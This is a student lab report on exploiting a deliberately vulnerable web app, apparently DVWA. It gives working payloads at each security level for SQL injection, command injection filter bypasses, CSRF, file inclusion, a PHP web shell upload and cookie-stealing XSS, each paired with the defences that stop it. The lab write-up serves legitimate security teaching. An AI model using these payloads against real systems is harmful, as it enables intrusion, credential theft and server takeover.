# Cybersecurity Lab: Vulnerability Analysis & Exploitation
# Ikramah Elahi (ie08941)

---

## 1. Brute Force
### [LOW]
* **Payload Used:** `username = admin' OR '1'='1`
* **Result:** Login Successful.
* **Why it worked:** The login form lacks input sanitization. By injecting `OR '1'='1'`, the SQL query evaluates to true, bypassing password verification.
* **Why it failed at higher level:** Higher levels implement input cleaning/parameterization, neutralizing SQL syntax tricks.

### [MEDIUM]
* **Payload Used:** `http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login..."`
* **Result:** Login Successful via Hydra.
* **Why it worked:** The system allowed rapid, automated attempts. A weak password ("password") was easily found using a common wordlist.
* **Why it failed at higher level:** Introduction of account lockouts, rate limiting, and sleep delays makes automation impractical.

---

## 2. Command Injection
### [LOW]
* **Payload Used:** `127.0.0.1; ls`
* **Result:** Listed server files.
* **Why it worked:** The application concatenates user input directly into a shell command. The `;` acts as a command separator.
* **Why it failed at higher level:** Special characters like `;` are blacklisted.

### [MEDIUM]
* **Payload Used:** `asda || ls`
* **Result:** Executed `ls` after a failed ping.
* **Why it worked:** The `||` operator executes the second command if the first fails. Since "asda" isn't a valid IP, the shell moved to the next command.
* **Why it failed at higher level:** Logical operators (`||`, `&&`) are filtered out.

### [HIGH]
* **Payload Used:** `|ls`
* **Result:** System files listed.
* **Why it worked:** The filter specifically looked for `| ` (pipe with a space). Removing the space bypassed the logic.
* **Why it failed at higher level:** Strict validation (regex) only allows numeric IP formats.

---

## 3. CSRF (Cross-Site Request Forgery)
### [LOW]
* **Payload Used:** `http://localhost:8080/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change`
* **Result:** Admin password changed via link.
* **Why it worked:** No origin checking. If a logged-in admin clicks the URL, the browser sends the session cookie automatically.
* **Why it failed at higher level:** Implementation of Anti-CSRF tokens or SameSite cookie attributes.

---

## 4. File Inclusion (LFI/RFI)
### [LOW]
* **Payload Used:** `page=php://filter/convert.base64-encode/resource=../../../../../var/www/html/hackable/flags/fi.php`
* **Result:** Hidden PHP source code revealed.
* **Why it worked:** The PHP `include()` function accepts arbitrary paths, allowing directory traversal.

### [MEDIUM]
* **Payload Used:** `page=....//....//....//....//var/www/html/hackable/flags/fi.php`
* **Result:** Sensitive file accessed.
* **Why it worked:** The filter performed a non-recursive replacement of `../`. Nesting them (`....//`) resulted in a valid path after the first pass.

### [HIGH]
* **Payload Used:** `page=file:///var/www/html/hackable/flags/fi.php`
* **Result:** File contents viewed.
* **Why it worked:** The use of the `file://` protocol bypassed basic string filters.
* **Why it failed at higher level:** The application uses an "Allow List" of specific filenames.

---

## 5. File Upload
### [LOW]
* **Payload Used:** `cyber.php` containing `<?php system($_REQUEST["cmd"]); ?>`
* **Result:** Remote Code Execution (RCE) achieved.
* **Why it worked:** No file extension or MIME-type validation.

### [MEDIUM]
* **Payload Used:** Intercepted request via Curl/Burp: `type=image/jpeg`
* **Result:** Malicious PHP file uploaded successfully.
* **Why it worked:** The server trusted the `Content-Type` header provided by the client, which is easily spoofed.
* **Why it failed at higher level:** The server validates the actual file signatures (magic bytes) and checks image dimensions.

---

## 6. SQL Injection
### [LOW]
* **Payload Used:** `0' UNION SELECT first_name, password FROM users #`
* **Result:** Dumped user database.
* **Why it worked:** Direct concatenation of input into the query string.

### [MEDIUM]
* **Payload Used:** Updated value in dropdown: `1 OR 1=1`
* **Result:** All credentials retrieved.
* **Why it worked:** Lack of server-side validation on POST parameters.

### [HIGH]
* **Payload Used:** `0' UNION SELECT first_name, password FROM users #`
* **Result:** Data leaked.
* **Why it worked:** The limit on input was only enforced on the UI/client-side.
* **Why it failed at higher level:** Use of Prepared Statements (Parameterized Queries).

---

## 7. Cross-Site Scripting (XSS)

### DOM-Based
* **High Payload:** `...default=English#<script>alert(document.cookie)</script>`
* **Why it worked:** The fragment identifier (`#`) isn't sent to the server, so server-side filters never see the script, but the browser executes it.

### Reflected
* **Medium Payload:** `<img src="x" onerror=alert(1)>`
* **Why it worked:** The developer only blacklisted `<script>` tags; other event handlers (like `onerror`) remained functional.

### Stored
* **Mechanism:** The script is saved to the database (e.g., in a guestbook) and executes every time a user views the page.
* **Mitigation:** Output encoding (converting `<` to `&lt;`) prevents the browser from interpreting data as code.

---

## Security Analysis & Conclusions

### Why does SQL Injection succeed at Low security?
The application lacks **input sanitization** and **parameterization**. It treats user input as executable code, allowing attackers to manipulate the structure of database queries.

### What control prevents it at High?
**Prepared Statements** (Parameterized Queries) are the primary defense. They ensure the database treats input strictly as data, never as code. Additionally, strict input validation (e.g., ensuring a User ID is only an integer) prevents unexpected characters from entering the logic.

### Does HTTPS prevent these attacks?
**No.** HTTPS only protects "data in transit" from eavesdropping (Man-in-the-Middle). It does not validate the *content* of the data. An attacker can send a malicious payload over a secure, encrypted HTTPS connection just as easily as an unencrypted one.

### Risks of Public Deployment
* **Data Breach:** Unauthorized access to PII (Personally Identifiable Information).
* **RCE:** Total server takeover via Command Injection or File Upload.
* **Reputational Damage:** Defacement of the site via XSS.
* **Lateral Movement:** Using the compromised server to attack internal networks.

---

## OWASP Top 10 Mapping (2021)

| Vulnerability | OWASP Category |
| :--- | :--- |
| Brute Force | A07:2021 – Identification and Authentication Failures |
| Command Injection | A03:2021 – Injection |
| CSRF | A01:2021 – Broken Access Control |
| File Inclusion | A03:2021 – Injection |
| File Upload | A04:2021 – Insecure Design |
| SQL Injection | A03:2021 – Injection |
| XSS (All types) | A03:2021 – Injection |
| Weak Session IDs | A07:2021 – Identification and Authentication Failures |
